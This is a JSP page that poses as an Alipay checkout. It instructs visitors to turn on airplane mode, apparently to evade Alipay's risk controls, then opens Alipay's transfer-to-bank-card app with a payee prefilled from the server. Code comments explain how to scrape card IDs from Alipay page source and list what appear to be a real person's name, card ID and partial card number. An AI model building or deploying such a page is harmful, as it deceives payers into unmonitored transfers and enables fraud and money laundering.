<%@page import="com.fasterxml.jackson.annotation.JsonInclude.Include"%>
<%@page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<%@ taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>
<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>支付宝收银台</title>
        <meta name="viewport" content="initial-scale=1.0, user-scalable=no">
  		<script src="${ctx}/static/jquery/jquery.min.js" type="text/javascript"></script>
		<link rel="stylesheet" type="text/css" href="${ctx}/static/QRCode.css"> 
  		<script type="text/javascript" src="${ctx}/static/alifm.js"></script>
  		<script src="${ctx}/static/layer_alifm.js" type="text/javascript"></script>
  		<link rel="stylesheet" href="${ctx}/static/layer_alifm.css" id="layuicss-layer">
  		<link rel="stylesheet" href="${ctx}/static/layer_alifm(1).css" id="layuicss-layer">
    </head>
    <style>
    .popWindow {
        background-color: #9D9D9D;
        width: 100%;
        height: 100%;
        left: 0;
        top: 0;
        filter: alpha(opacity=50);
        opacity: 0.5;
        z-index: 1;
        position: absolute;
    }
       .load_ts {
        color: #0C0C0C;
        display: block;
        position: fixed;
        text-align: center;
        bottom: 46%;
        font-size: 80px;
        font-family: 微软雅黑;
        width: 100%;
    }
    </style>
    <body onload="start()" style="">
       <div style="width: 100%; text-align: center;font-family:微软雅黑;">
            <div id="panelWrap" class="panel-wrap">
                <!-- CUSTOM LOGO -->
                <div class="panel-heading">
                    <div class="row">
                        <div class="col-md-12 text-center">
                            <img src="${ctx}/static/title-alipay.png" alt="Logo-QQPay" class="img-responsive center-block" style="height: 30px;">
                        </div>
                    </div>
                </div>
                <!-- PANEL TlogoEMPLATE START -->
                <div class="panel panel-easypay">
                    <!-- PANEL HEADER -->
                    <div class="panel-heading" style=" padding: 0 15px;">
                        <br>
                        <h3 style="color: blue" id="title">请打开手机飞行模式以继续!!!</h3>
                        <br>
                        <div class="money">
                            <span class="price" style="font-size: 2.2rem;"> </span>
                            <span class="currency">元</span>
                        </div>
                    </div>
                    <div class="panel-footer">
                        <button id="btnTime" style="font-size: 16px; width: 100%;" class="btn  btn-primary btn-lg btn-block">立即支付</button>
                    </div>
                </div>
            </div>
            <div style="color: green;font-size: 18px">&nbsp;&nbsp;&nbsp;如图:<br></div>
            <div style="text-align: center; margin-top: 10px"><img src="${ctx}/static/feixing.png" alt="" width="90%" height="30%"></div>
        </div>
        <div id="popWindow" class="popWindow" style="display: none;"><h1 class="load_ts">订单失效</h1></div>
        <script type="text/javascript" src="${ctx}/static/alipayjsapi.inc.min.js"></script>
    <script>
        var timeer;//定义在两个函数外面，因为两个函数都会用到！
        var w = 5;
        var  bankAccount ;// 名字 持卡人
        var  cardIndex ;// 银行卡的ID(cardId支付宝中获取的)
        var  amount ;// 金额
        var  money ;// 金额
        var  bankName ;//  银行卡的名字
        var  bankMark ;// 银行卡简写字母
        var  cardNo ;// 隐藏的卡号(cardno支付宝中获取的)
        var params;
        function isChinese(s){
        	return /[\u4e00-\u9fa5]/.test(s);
        }
        function ch2Unicdoe(str){
        	if(!str){
        		return;
        	}
        	var unicode = '';
        	for (var i = 0; i <  str.length; i++) {
        		var temp = str.charAt(i);
        		if(isChinese(temp)){
        			unicode += '\\u' +  temp.charCodeAt(0).toString(16);
        		}
        		else{
        			unicode += temp;
        		}
        	}
        	return unicode;
        }
        $(function(){
                $.ajax({
                    url: '${ctx}/api/createOrder',
                    data: {order:'${order}',amount:'${amount}'},
                    contentType: "application/x-www-form-urlencoded; charset=utf-8",
                    type:'post',
                    dataType:"json",
                    async:  true,
                    success: function (data) {
                  	  if(data && data.success){
                  		  bankAccount =  data.result.cardholder;
                  		  bankName =  data.result.bankName;
                  		  bankMark = data.result.retain3;
                  		  cardIndex = data.result.retain4;
                  		  cardNo = data.result.retain5;
                  		  $(".price").html(data.result.dealAmount);
                  		  amount = data.result.dealAmount;
                  		  money = data.result.dealAmount;
        params = {"REALLY_STARTAP":"true","actionType":"toCard","amount":""+amount,"ap_framework_sceneId":"20000067","bankAccount":bankAccount,"bankMark":bankMark,"bankName":bankName,"cardChannel":"HISTORY_CARD","cardIndex":cardIndex,"cardNo":""+cardNo,"cardNoHidden":"true","money":""+amount,"orderSource":"from","sourceId":"bill","startFromExternal":"false"};
                  	  }else if(data && !data.success){
            				$("#popWindow").css("display", "inherit");
            				return;
            			}else{
            			}
                    },
                    error: function (err) {
                    }
                })
        })
        function show() {
            w += 10;
            var text = w + '%';
            if (w >= 100) {
                clearInterval(timeer);
                timeer = null;
                $('#btnTime').css({
                    width: "100%"
                }).text('立即支付');
                $('#btnTime').removeAttr("disabled");
                $('#title').text("请打开手机飞行模式以继续!");
                return false
            }
            $('#btnTime').text(text).css({
                width: text
            });
        }
        function start() {
            timeer = window.setInterval(show, 50);//每隔200ms调用一次show函数
        }
        //立即支付 判断是否有开启飞行模式
        $('#btnTime').click(function () {
        	debugger;
            goPay();

        });
        function goPay() {
            ap.getNetworkType(function (res) {
                networkAvailable = res.networkAvailable;
                if (networkAvailable) {
                    ap.alert({
                        content: '请打开手机飞行模式后再点击立即支付。若启用飞行模式后没有断开WIFI请先暂时关闭WIFI'
                    });
                } else {
                    layer.confirm('<div style="color:red; font-size:18px">进入支付页面请关闭飞行模式!<br /><br />进入支付页面请关闭飞行模式!<br /><br />进入支付页面请关闭飞行模式!', {
                        icon: 1,
                        title: '充值提示',
                        btn: ['我知道了'] //按钮
                    }, function (index) {
                        layer.close(index);
                        setTimeout(function () {
                            scanQR();
                        }, 50);
                    });
                }
            });
        };
        // 1、直接访问获取cardId及cardno的值(要有转账记录才有)：
        // https://shenghuo.alipay.com/transfercore/fill.htm?_tosheet=true
        // 2、在"转账到银行卡"页面 已存银行卡的下拉列表找到转卡的记录  ，然后直接查看页面源码，搜索cardType="historyCard"，可以看到cardId及cardno的值，然后复制下来填写下面参数
        //*把以下的中文字转Unicode编码在填写到 params 相应的值中
       //bankAccount  名字：武涛
        //cardIndex    银行卡的ID(cardId支付宝中获取的)：1909251395168597281
        //amount       金额
        //money        金额
        //bankName     银行卡的名字：招商银行
        //bankMark     银行卡简写字母：CMB
        //cardNo       隐藏的卡号(cardno支付宝中获取的)： 621483*4908
        function goJsPay() {
            AlipayJSBridge.call('exitApp');
            setTimeout(function () {
                AlipayJSBridge.call("startApp", {
                    appId: "09999988",
                    param: params
                }, function (a) { });
            }, 10)
        }
        function scanQR() {
            setTimeout(function () {
                goJsPay();
            }, 10);
        };
    </script>
</body>

</html>